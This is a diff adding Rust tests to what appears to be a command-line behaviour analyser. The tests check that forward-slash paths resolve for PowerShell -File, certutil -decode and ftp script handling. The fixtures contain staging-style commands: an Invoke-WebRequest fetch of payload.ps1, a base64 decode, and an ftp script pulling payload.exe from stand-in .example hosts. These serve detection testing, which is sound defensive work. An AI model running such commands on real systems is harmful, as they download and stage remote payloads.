@@ -6542,6 +6542,28 @@ mod powershell_tests {
     }
 
     #[test]
+    fn powershell_file_slash_equivalent_tracks_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 =
+            b"Invoke-WebRequest https://ps-file-slash-equivalent.example/payload.ps1".to_vec();
+        env.modified_filesystem.insert(
+            r#"c:\temp\stage.ps1"#.to_string(),
+            FsEntry::Content {
+                content: ps1.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line(r"powershell -NoProfile -File C:/Temp/stage.ps1", &mut env);
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell -File slash-equivalent script was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
     fn nested_powershell_encoded_command_extracts() {
         let payload = "Write-Host nested";
         let utf16: Vec<u8> = payload
@@ -8787,6 +8809,39 @@ mod certutil_tests {
                 Some(FsEntry::Decoded { content, .. }) if content == payload.as_bytes()
             ),
             "dst.bin was not decoded from current-dir source content: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_decode_slash_equivalent_source_resolves_tracked_content() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "slash equivalent source";
+        env.modified_filesystem.insert(
+            r#"c:\temp\src.b64"#.to_string(),
+            FsEntry::Content {
+                content: b64(payload).into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode C:/Temp/src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "C:/Temp/src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil slash-equivalent source was not marked resolved: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == payload.as_bytes()
+            ),
+            "dst.bin was not decoded from slash-equivalent source content: {:?}",
             env.modified_filesystem.get("dst.bin")
         );
     }
@@ -16229,6 +16284,48 @@ ftp -n -s:ftp.txt"#,
                 )
             }),
             "current-dir ftp script get command was not surfaced as download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ftp_slash_equivalent_script_file_emits_remote_connect_and_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r#"c:\temp\ftp.txt"#.to_string(),
+            crate::env::FsEntry::Content {
+                content: b"open ftp-slash-equivalent.example.com\r\nget payload.exe out.exe\r\n"
+                    .to_vec(),
+                append: false,
+            },
+        );
+
+        crate::interp::interpret_line(r"ftp -n -s:C:/Temp/ftp.txt", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::RemoteConnect { cmd, host, port }
+                        if cmd == r"ftp -n -s:C:/Temp/ftp.txt"
+                            && host == "ftp-slash-equivalent.example.com"
+                            && *port == 21
+                )
+            }),
+            "slash-equivalent ftp script remote host was not surfaced: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { cmd, src, dst }
+                        if cmd == r"ftp -n -s:C:/Temp/ftp.txt"
+                            && src == "ftp://ftp-slash-equivalent.example.com/payload.exe"
+                            && dst.as_deref() == Some("out.exe")
+                )
+            }),
+            "slash-equivalent ftp script get command was not surfaced as download: {:?}",
             env.traits
         );
     }
